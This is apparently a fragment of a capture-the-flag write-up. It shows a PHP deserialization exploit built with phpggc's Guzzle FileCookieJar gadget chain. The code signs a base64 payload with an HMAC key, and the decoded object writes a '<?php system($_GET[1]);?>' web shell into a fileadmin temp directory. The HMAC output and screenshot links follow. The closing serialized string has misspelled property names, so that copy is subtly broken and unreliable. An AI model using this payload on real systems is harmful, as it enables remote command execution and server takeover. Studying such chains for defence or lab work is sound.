echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2F1eC5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6NTI6Ijw/cGhwICRvdXRwdXQgPSBzeXN0ZW0oJF9HRVRbMV0pOyBlY2hvICRvdXRwdXQgOyA/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
?>


:~/Enterprize/phpggc# php script.php
0363a381be6878cf3e68acf0c83164642938bcd2


<img width="1120" height="674" alt="image" src="https://github.com/user-attachments/assets/52ab6cc1-93dc-45f6-a2b1-4d24d63f7926" />


<img width="847" height="254" alt="image" src="https://github.com/user-attachments/assets/eac23ae1-4425-44ee-a87c-c2fde960541f" />




<img width="1123" height="357" alt="image" src="https://github.com/user-attachments/assets/231d6aee-0fad-4e5e-953f-abb33929a809" />


<img width="1122" height="357" alt="image" src="https://github.com/user-attachments/assets/cba0417a-d12d-4a29-8fb0-747008b02e12" />


a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"GuzzleHttp\Cookie\CookieJarCookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>";}}}s:39:".GuzzleHttp\Cookie\CookieJarstrictMode";N;s:41:"GuzzleHttp\Cookie\FileCookieJarFilnemae";s:50:"/var/html/public/fileadmin/_temp_/backdoor.php";s:52:"GuzzleHttp\Cookie\FileCookieSessionCookies";b:1;}i:7;i:7;}
